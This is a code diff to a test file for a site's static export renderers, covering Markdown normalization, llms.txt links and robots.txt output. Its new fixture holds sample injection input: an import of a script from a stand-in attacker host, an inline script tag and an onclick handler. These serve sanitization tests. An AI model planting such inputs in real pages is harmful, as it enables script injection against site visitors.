@@ -1,3 +1,4 @@
+import { normalizePublicMarkdownContent } from '@nibleaf/shared/public-markdown-content';
 import type { SiteSnapshot } from '@nibleaf/shared/site';
 import { THEME_PRESET_IDS } from '@nibleaf/shared/themes';
 import { unzipSync } from 'fflate';
@@ -88,6 +89,15 @@ const required = <T>(value: T | undefined): T => {
 };
 
 describe('export renderers', () => {
+  it('uses the shared live/static Markdown normalization contract', () => {
+    const content =
+      'import Exploit from "https://attacker.example/exploit.js"\n\n<Callout>**Portable**</Callout>\n\n<script>run()</script>\n\n<Raw onclick="run()">text</Raw>';
+    const page = { ...required(snapshot.pages[0]), content };
+    const files = unzipSync(renderStaticHtml({ ...snapshot, pages: [page] }, assets).bytes);
+
+    expect(text(required(files['main/ar/intro/index.md']))).toBe(`# مقدمة\n\n${normalizePublicMarkdownContent(content)}\n`);
+  });
+
   it('rewrites internal links and allowlisted assets for offline static output', () => {
     const files = unzipSync(renderStaticHtml(snapshot, assets).bytes);
     const intro = text(required(files['main/ar/intro/index.html']));
@@ -178,6 +188,8 @@ describe('export renderers', () => {
     expect(html).toContain('<meta property="og:type" content="article">');
     expect(html).toContain('<link rel="sitemap" type="application/xml" href="/sitemap.xml">');
     expect(html).toContain('href="/main/ar/llms-full.txt"');
+    expect(html).toContain('rel="alternate" type="text/markdown" href="/main/ar/intro/index.md"');
+    expect(html).toContain('rel="describedby" href="/main/ar/llms.txt"');
     expect(html).toContain('<script type="application/ld+json">');
     expect(html).toContain('"@type":"TechArticle"');
     expect(html).toContain('id="التثبيت"');
@@ -191,12 +203,13 @@ describe('export renderers', () => {
     const scopedIndex = text(required(files['main/ar/llms.txt']));
     const scopedFull = text(required(files['main/ar/llms-full.txt']));
 
-    expect(text(required(files['robots.txt']))).toBe('User-agent: *\nAllow: /\nSitemap: /sitemap.xml\n');
+    expect(text(required(files['robots.txt']))).toBe('User-agent: OAI-SearchBot\nAllow: /\n\nUser-agent: *\nAllow: /\nSitemap: /sitemap.xml\n');
     expect(text(required(files['sitemap.xml']))).toContain('<loc>/main/ar/intro/index.html</loc>');
-    expect(rootIndex).toContain('[مقدمة](main/ar/intro/index.html)');
-    expect(scopedIndex).toContain('[مقدمة](intro/index.html)');
-    expect(rootFull).toContain('Source: main/ar/intro/index.html');
-    expect(scopedFull).toContain('Source: intro/index.html');
+    expect(rootIndex).toContain('[مقدمة](main/ar/intro/index.md)');
+    expect(scopedIndex).toContain('[مقدمة](intro/index.md)');
+    expect(rootFull).toContain('Source: main/ar/intro/index.md');
+    expect(scopedFull).toContain('Source: intro/index.md');
+    expect(text(required(files['main/ar/intro/index.md']))).toContain('# مقدمة');
     expect(rootFull).not.toContain('globalThis.stolen');
     expect(rootFull).not.toContain('<script>');
   });
@@ -266,6 +279,7 @@ Before expression {globalThis.stolen({ nested: true })} after expression.
     const files = unzipSync(renderStaticHtml({ ...snapshot, pages: restrictedPages }, assets).bytes);
     expect(text(required(files['sitemap.xml']))).not.toContain('<url>');
     expect(text(required(files['llms.txt']))).not.toContain('[مقدمة]');
+    expect(files['main/ar/intro/index.md']).toBeUndefined();
     expect(text(required(files['main/ar/intro/index.html']))).toContain('<meta name="robots" content="noindex,nofollow">');
     expect(text(required(files['main/ar/setup/index.html']))).toContain('<link rel="canonical" href="https://example.com/setup">');
 
@@ -274,6 +288,7 @@ Before expression {globalThis.stolen({ nested: true })} after expression.
     );
     expect(text(required(privateFiles['robots.txt']))).toBe('User-agent: *\nDisallow: /\n');
     expect(text(required(privateFiles['llms-full.txt']))).toBe('');
+    expect(privateFiles['main/ar/intro/index.md']).toBeUndefined();
   });
 
   it('does not execute raw published HTML in static archives', () => {
